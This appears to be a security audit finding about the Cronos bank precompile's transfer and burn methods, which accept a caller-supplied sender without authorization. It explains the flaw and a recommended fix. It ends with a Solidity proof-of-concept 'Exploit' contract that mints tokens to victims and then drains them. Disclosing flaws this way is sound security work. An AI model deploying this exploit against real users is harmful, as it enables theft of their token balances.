### Title
Bank Precompile `transfer` Accepts Arbitrary Sender — Any Contract Can Drain Any Holder of Its Own Denom - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary

The bank precompile's `transfer` method accepts the `sender` address as a caller-supplied argument and passes it directly to `bankKeeper.SendCoins` with no check that `contract.Caller()` equals `sender`. Any EVM contract can therefore move `evm/<contract_address>`-denominated native bank tokens from any victim address to any recipient without the victim's approval.

### Finding Description

In `BankContract.Run`, the `TransferMethodName` branch unpacks `sender` from the ABI-encoded input (`args[0]`) and uses it as the `from` address for `bankKeeper.SendCoins`. The token denom is derived from `contract.Caller()`, so the scope is limited to the calling contract's own denom — but there is no guard requiring `sender == contract.Caller()` or any other authorization check on who may initiate the transfer. [1](#0-0) 

The `sender` field is taken verbatim from the call arguments:

```go
sender := args[0].(common.Address)   // attacker-controlled
...
from := sdk.AccAddress(sender.Bytes())
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

No line in the `TransferMethodName` case checks `contract.Caller() == sender` or verifies any allowance/approval. [2](#0-1) 

The `burn` branch has the same structural flaw: `recipient` (the address to burn from) is taken from `args[0]` with no caller-authorization check. [3](#0-2) 

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled assets.**

Any user who deploys a contract can:
1. Mint `evm/<contract_address>` tokens to victims (e.g., as part of a DeFi protocol or airdrop).
2. Later call `bank.transfer(victim, attacker, amount)` from that same contract to drain every victim's balance with no approval required.

The `evm/` denom tokens are real Cosmos SDK bank-module assets tracked in native state. Draining them is a direct, irreversible balance change with no recourse.

### Likelihood Explanation

Any unprivileged user can deploy a contract on Cronos EVM. The bank precompile is a live, registered precompile at address `0x0000000000000000000000000000000000000064`. The attack requires only a single contract deployment and one transaction. [4](#0-3) 

### Recommendation

In the `TransferMethodName` branch, enforce that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the calling contract")
}
```

Apply the same fix to the `BurnMethodName` branch (`recipient` must equal `contract.Caller()`). Alternatively, remove the `sender`/`recipient` argument entirely and derive the acting address solely from `contract.Caller()`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address to, uint256 amount) external payable returns (bool);
    function transfer(address from, address to, uint256 amount) external payable returns (bool);
}

contract Exploit {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<this_contract_address> tokens to a victim
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/<this_contract_address> balance — no approval needed
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Deploy `Exploit`; its address becomes the denom namespace (`evm/<Exploit_address>`).
2. Call `seedVictim(victim, 1000)` — victim now holds 1000 `evm/<Exploit_address>` tokens.
3. Call `drain(victim, attacker, 1000)` — the bank precompile executes `SendCoins(victim → attacker, 1000 evm/<Exploit_address>)` with no allowance check.
4. Victim's balance is zero; attacker received the tokens.

The root cause is the missing `sender == contract.Caller()` guard at: [1](#0-0)
